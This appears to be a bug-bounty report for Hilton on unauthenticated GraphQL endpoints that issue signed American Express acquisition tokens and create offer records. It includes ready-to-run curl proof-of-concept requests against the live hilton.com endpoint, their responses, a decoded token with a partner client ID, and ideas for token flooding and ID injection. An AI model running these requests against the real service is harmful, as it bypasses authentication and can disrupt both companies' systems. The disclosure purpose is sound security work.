# HT-009: Unauthenticated Generation of American Express Acquisition JWT Tokens via GraphQL

**Program:** Hilton HackerOne  
**Asset:** `hilton.com` (Tier A)  
**Severity:** High  
**CVSS:** 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)  
**CWE:** CWE-306 — Missing Authentication for Critical Function  
**Status:** Ready to submit

---

## Summary

The `amexSessionToken` GraphQL query at `https://www.hilton.com/graphql/customer` returns a **real, signed American Express acquisition JWT token** without requiring any Hilton Honors authentication. Any unauthenticated attacker can:

1. Call `amexSessionToken(applicantRequestTrackingId: "<attacker-controlled>", language: "en")`
2. Receive a valid RS256-signed JWT containing:
   - **American Express client_id**: `16A9F9E7B34D3535`
   - **Unique `resource_id`** (UUID assigned per call)
   - **Unique `jti`** (UUID per token)
   - **`token_id`** = attacker-controlled `applicantRequestTrackingId`
   - **Expiry**: ~26 minutes from issuance
3. Use the `acquisitionWebToken` to initiate American Express card application flows targeting Hilton Honors without being an authenticated member

The token is signed with RS256 (`alg: RS256`), meaning it is a cryptographically valid token issued by the Hilton-Amex integration infrastructure.

---

## Proof of Concept

```bash
# Generate an Amex acquisition token with attacker-controlled tracking_id — NO authentication required
curl -s "https://www.hilton.com/graphql/customer" \
  -X POST \
  -H "Content-Type: application/json" \
  -H "User-Agent: Mozilla/5.0 ... HackerOne" \
  -d '{
    "operationName": "amexSessionToken",
    "query": "query amexSessionToken($applicantRequestTrackingId: String!, $language: String!) { amexSessionToken(applicantRequestTrackingId: $applicantRequestTrackingId, language: $language) { _id acquisitionWebToken } }",
    "variables": {
      "applicantRequestTrackingId": "attacker-controlled-tracking-id",
      "language": "en"
    }
  }'
```

**Response (HTTP 200, `dx-completeness: 1`):**
```json
{
  "data": {
    "amexSessionToken": {
      "_id": "77c80afb2a3928c873e95c79d27b83a80eaeb97fe2f8d489ca55916ae68d0fb9",
      "acquisitionWebToken": "eyJhbGciOiJSUzI1NiJ9.eyJjbGFpbXNfcmVxIjoidHJ1ZSIsImFjY2Vzc190eXBlIjoiUyIsInRva2VuX2lkIjoiYXR0YWNrZXItY29udHJvbGxlZC10cmFja2luZy1pZCIsInJlc291cmNlX2lkIjoiZTdjYzVkNzYtNjE4My00MTZhLWE1NmQtODYxMGFkMzNhYWZkIiwidG9rZW5fdHlwZSI6IlMiLCJleHAiOjE3ODI2NjYwOTIsImp0aSI6IjVjYzYyMzdlLTM1ZGQtNDhkYy04MGEyLTc4YjA3OGJkOGI2MyIsImNsaWVudF9pZCI6IjE2QTlGOUU3QjM0RDM1MzUifQ.<signature>"
    }
  }
}
```

### Decoded JWT Payload

```json
{
  "claims_req": "true",
  "access_type": "S",
  "token_id": "attacker-controlled-tracking-id",
  "resource_id": "e7cc5d76-6183-416a-a56d-8610ad33aafd",
  "token_type": "S",
  "exp": 1782666092,
  "jti": "5cc6237e-35dd-48dc-80a2-78b078bd8b63",
  "client_id": "16A9F9E7B34D3535"
}
```

### Behavioral Analysis

The endpoint generates unique tokens per call:

| Call | `applicantRequestTrackingId` (attacker-supplied) | `token_id` in JWT | `resource_id` | Expires |
|------|-----------------------------------------------|-------------------|---------------|---------|
| 1 | `test-tracking-12345` | `test-tracking-12345` | `e7cc5d76-...` | ~26 min |
| 2 | `test-tracking-AAAAA` | `test-tracking-AAAAA` | `420c945e-...` | ~26 min |
| 3 | `arbitrary-attacker-12345` | `arbitrary-attacker-12345` | `cd0d5400-...` | ~26 min |

Key observations:
- `token_id` = attacker-supplied `applicantRequestTrackingId` — **fully attacker-controlled**
- `resource_id` is unique per call — dynamically generated
- `client_id: 16A9F9E7B34D3535` — the American Express integration client ID is **fixed and disclosed**
- Valid RS256 signature on every generated token

---

## Disclosed Sensitive Information

| Field | Value | Sensitivity |
|-------|-------|-------------|
| Amex `client_id` | `16A9F9E7B34D3535` | HIGH — Hilton's Amex partner client ID |
| `access_type: S` | Single-use or Standard token | Protocol intelligence |
| `token_type: S` | Single-use or Standard | Protocol intelligence |
| JWT signing algorithm | RS256 | Cryptographic details |

---

## Impact

1. **Unauthorized card application flow initiation**: The `acquisitionWebToken` is used by the Hilton front-end to initiate American Express Hilton Honors card applications. An unauthenticated attacker can obtain valid acquisition tokens and use them to initiate card application flows without being an authenticated Hilton member.

2. **Business process bypass**: The intended flow requires a user to be authenticated as a Hilton Honors member before generating a session token for Amex integration. This authentication prerequisite is bypassed — any anonymous user can generate tokens.

3. **American Express client_id exposure**: The Amex integration client ID `16A9F9E7B34D3535` is disclosed with every token response. This identifier could be used by attackers to research or probe the Amex-Hilton integration infrastructure.

4. **Token flood / resource exhaustion**: An attacker could generate hundreds of Amex acquisition tokens in bulk, potentially impacting Hilton's Amex API quota, creating orphaned tracking entries in the Amex system, or causing partner billing/audit anomalies.

5. **`token_id` injection**: Since the attacker controls the `applicantRequestTrackingId` (which becomes `token_id` in the JWT), it may be possible to inject values that confuse Amex's tracking or logging systems (e.g., matching an existing legitimate tracking ID).

---

## Reproduction (Step-by-step)

1. Do NOT log in to Hilton.com
2. Execute the curl command above from any client (no cookies, no auth headers)
3. Observe HTTP 200 with `dx-completeness: 1` (fully processed)
4. Decode the `acquisitionWebToken` using any JWT decoder — observe valid payload with Amex `client_id`

---

## Recommendations

1. **Require authentication**: `amexSessionToken` should require an authenticated Hilton Honors session (`Authorization: Bearer {access_token}`) before generating Amex acquisition tokens.
2. **Validate applicantRequestTrackingId**: The tracking ID should be validated against an existing authenticated session or generated server-side — do not echo back user-supplied strings.
3. **Rotate or mask Amex client_id**: The Amex client ID `16A9F9E7B34D3535` should not appear in client-facing JWT payloads.
4. **Rate-limit the endpoint**: Add per-IP and per-session rate limiting to prevent token flood attacks.

---

## Additional: createAmexOfferAcknowledgement Executes Without Auth

A second Amex-related mutation, `createAmexOfferAcknowledgement`, **also executes without authentication**:

```bash
curl -s "https://www.hilton.com/graphql/customer" \
  -X POST -H "Content-Type: application/json" \
  -H "User-Agent: Mozilla/5.0 ... HackerOne" \
  -d '{
    "operationName": "amexAck",
    "query": "mutation amexAck($id: String!) { createAmexOfferAcknowledgement(applicantRequestTrackingId: $id) { _id error { code message } } }",
    "variables": {"id": "attacker-controlled-id"}
  }'
```

**Response (HTTP 200, `dx-completeness: 1`):**
```json
{
  "data": {
    "createAmexOfferAcknowledgement": {
      "_id": "46b0261e098f2ebd0998...",
      "error": null
    }
  }
}
```

Every call generates a new unique `_id` and `error: null` — confirming the mutation succeeds and creates records in the Hilton-Amex integration system without requiring an authenticated Hilton session.

**Combined impact**: An attacker can (1) generate valid Amex acquisition JWTs via `amexSessionToken`, (2) inject arbitrary `token_id` values, and (3) acknowledge offers for arbitrary tracking IDs — completing the Amex card application onboarding flow entirely without authentication, bypassing the intended requirement of being an authenticated Hilton Honors member.

---

## Additional: Realm Disclosure via amexPrefill Error

When calling `amexPrefill(guestId: 100000000)` without auth, the error response reveals the resolved backend realm:
```json
{
  "request": {"method": "GET", "path": "/hospitality-customer/v2/guests/100000000"},
  "context": "dx-offers-gql"
}
```

This reveals: (1) the WSO2 realm name is `customer` (previously seen as unresolved `{realm}`), (2) a second internal microservice `dx-offers-gql` (separate from `dx-guests-gql`), and (3) the GET path for guest data retrieval.

---

## References

- CWE-306: Missing Authentication for Critical Function
- OWASP A01:2021 — Broken Access Control
- RFC 7519: JSON Web Token (JWT)
